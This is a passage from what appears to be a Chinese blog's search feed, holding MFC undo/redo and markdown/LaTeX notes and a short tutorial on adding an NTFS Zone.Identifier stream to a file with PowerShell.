</tr>
</thead>
<tbody>
<tr>
<td>插入</td>
<td>从m_shapeLst删除pShape</td>
<td>向m_shapeLst中加入pShape</td>
</tr>
<tr>
<td>删除</td>
<td>向m_shapeLst中加入pShape</td>
<td>从m_shapeLst删除pShpe</td>
</tr>
<tr>
<td>移动</td>
<td>ptNew  —&gt; ptOld</td>
<td>ptOld   —&gt;   ptNew</td>
</tr>
<tr>
<td>旋转</td>
<td>ptNew  —&gt; ptOld</td>
<td>ptOld   —&gt;   ptNew</td>
</tr>
<tr>
<td>修改</td>
<td>InfoNew —&gt; InfoOld</td>
<td>InfoOld  —&gt;  InfoNew</td>
</tr>
</tbody>
</table>
</div>
<ol>
<li>撤销动作<ul>
<li>从撤销链表尾部取出一个ICommand* pCmd 命令对象</li>
<li>将pCmd 命令对象加入到重做链表的尾部</li>
<li>调用pCmd-&gt;UnExecCommand</li>
</ul>
</li>
</ol>
<p>有序表中间插内容：<br>1. 间接通过<code>doc</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">CMyCadDoc* pDoc = GetDocument();</span><br><span class="line">pDoc-&gt;UpdateAllViews(<span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
<p>2. 直接调用<code>view</code>方法</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pDoc-&gt;GetFirstViewPosition</span><br><span class="line">pDoc-&gt;GetNextView</span><br><span class="line">pView-&gt;IsKindOf(RUNTIME_CLASS(CXXXView)</span><br></pre></td></tr></table></figure>
<p>3. <code>MainFrm</code>中保存各<code>View</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">CSplitterWnd::GetPane</span><br><span class="line">CSplitterWnd::SetActiveView</span><br><span class="line">CSplitterWnd::GetActiveVIew</span><br></pre></td></tr></table></figure>
<p>中划线</p>
<p><del>要划除的行内内容</del></p>
<p>上划线和下划线，用数学公式：</p>
<p>上划线<br>$\overline{测试文本}$</p>
<p>下划线<br>$\underline{测试文本}$</p>
<p>Latex中点乘、叉乘、除以：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">点乘：a \cdot b</span><br><span class="line">叉乘：a \times b</span><br><span class="line">除以：a \div b</span><br></pre></td></tr></table></figure>
<p>点乘：$a \cdot b$</p>
<p>叉乘：$a \times b$</p>
<p>除以：$a \div b$</p>
<hr>
<p>这个链接写的也不错<br><a href="http://www.jianshu.com/p/21d355525bdf">http://www.jianshu.com/p/21d355525bdf</a></p>
<hr>
<p>详细的<br><a href="http://www.wiz.cn/feature-markdown.html">http://www.wiz.cn/feature-markdown.html</a></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>手工构造Zone.Identifier文件</title>
    <url>/2022/05/07/%E9%9A%8F%E7%AC%94/%E6%89%8B%E5%B7%A5%E6%9E%84%E9%80%A0Zone-Identifier%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="Zone-Identifier文件是什么"><a href="#Zone-Identifier文件是什么" class="headerlink" title="Zone.Identifier文件是什么"></a>Zone.Identifier文件是什么</h2><blockquote>
<p>从网上下载的文件始终可能包已含损坏数据或恶意软件。 因此，网络浏览器在NTFS ADS（备用数据流）区域中存储有关下载文件位置的信息。 该信息称为“zone.identifier（区域标识符信息）”，由安全程序使用。</p>
</blockquote>
<p>（摘自<a href="https://www.bandisoft.com/bandizip/help/zone-identifier/">https://www.bandisoft.com/bandizip/help/zone-identifier/</a>）</p>
<h2 id="手工构造Zone-Identifier的步骤"><a href="#手工构造Zone-Identifier的步骤" class="headerlink" title="手工构造Zone.Identifier的步骤"></a>手工构造Zone.Identifier的步骤</h2><p>因为完整的文件名是<code>sample.exe: Zone.Identifier</code> ，文件中存在<code>:</code> （冒号）导致无法直接创建文件，所以需要powershell创建：</p>
<figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="code"><pre><span class="line">set-content -path .\sample.exe -stream Zone.Identifier</span><br></pre></td></tr></table></figure>
<p>然后在提示<code>Value[0]</code>中输入：<code>[ZoneTransfer]</code> </p>
<p>在<code>Value[1]</code>中输入：ZoneId=3</p>
<p>在<code>Value[2]</code>中直接回车。</p>
<p>整体效果如下：</p>
<figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="code"><pre><span class="line">PS C:\Users\admin\Downloads&gt; set-content -path .\sample.exe -stream Zone.Identifier</span><br><span class="line"></span><br><span class="line">位于命令管道位置 1 的 cmdlet Set-Content</span><br><span class="line">请为以下参数提供值:</span><br><span class="line">Value[0]: [ZoneTransfer]</span><br><span class="line">Value[1]: ZoneId&#x3D;3</span><br><span class="line">Value[2]:</span><br><span class="line">PS C:\Users\admin\Downloads&gt;</span><br></pre></td></tr></table></figure>
<p>使用以下命令确认生效：<code>get-item -path .\sample.exe -stream *</code> ，例如：</p>
<figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="code"><pre><span class="line">PS C:\Users\admin\Downloads&gt; get-item -path .\sample.exe -stream *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\Users\admin\Downloads\sample.exe::$DATA</span><br><span class="line">PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\Users\admin\Downloads</span><br><span class="line">PSChildName   : sample.exe::$DATA</span><br><span class="line">PSDrive       : C</span><br><span class="line">PSProvider    : Microsoft.PowerShell.Core\FileSystem</span><br><span class="line">PSIsContainer : False</span><br><span class="line">FileName      : C:\Users\admin\Downloads\sample.exe</span><br><span class="line">Stream        : :$DATA</span><br><span class="line">Length        : 1554195</span><br><span class="line"></span><br><span class="line">PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\Users\admin\Downloads\sample.exe:Zone.Identifier</span><br><span class="line">PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\Users\admin\Downloads</span><br><span class="line">PSChildName   : sample.exe:Zone.Identifier</span><br><span class="line">PSDrive       : C</span><br><span class="line">PSProvider    : Microsoft.PowerShell.Core\FileSystem</span><br><span class="line">PSIsContainer : False</span><br><span class="line">FileName      : C:\Users\admin\Downloads\sample.exe</span><br><span class="line">Stream        : Zone.Identifier</span><br><span class="line">Length        : 26</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>创建<code>Zone.Identifier</code> 文件前后效果对比：</p>
<p><img src="/2022/05/07/%E9%9A%8F%E7%AC%94/%E6%89%8B%E5%B7%A5%E6%9E%84%E9%80%A0Zone-Identifier%E6%96%87%E4%BB%B6/pqDx4PF8d4VnuqjokFSJM09yXy2rWzMeQWStyo9fS6k.png" alt="image"></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
</search>
